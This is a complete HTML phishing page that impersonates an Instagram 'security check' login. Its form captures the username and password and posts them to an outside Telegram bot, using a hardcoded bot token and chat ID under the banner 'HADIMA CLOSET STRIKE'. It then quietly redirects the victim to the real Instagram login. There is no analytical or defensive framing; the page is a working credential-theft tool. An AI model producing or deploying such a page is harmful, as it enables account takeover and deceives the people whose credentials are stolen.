<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Security Check</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; }
        h2 { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #262626; }
        p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; padding: 10px; background: #0095f6; border: none; color: white; border-radius: 4px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Instagram</h2>
    <p>Unusual activity detected. Please verify your identity.</p>
    <form id="authForm">
        <input type="text" id="username" placeholder="Username or Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
</div>

<script>
document.getElementById('authForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    const botToken = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
    const chatId = '8639892987';
    const message = `🔥 HADIMA CLOSET STRIKE 🔥\n\n👤 User: ${user}\n🔑 Pass: ${pass}`;

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
    } catch (err) {}

    window.location.href = "https://www.instagram.com/accounts/login/";
});
</script>

</body>
</html>
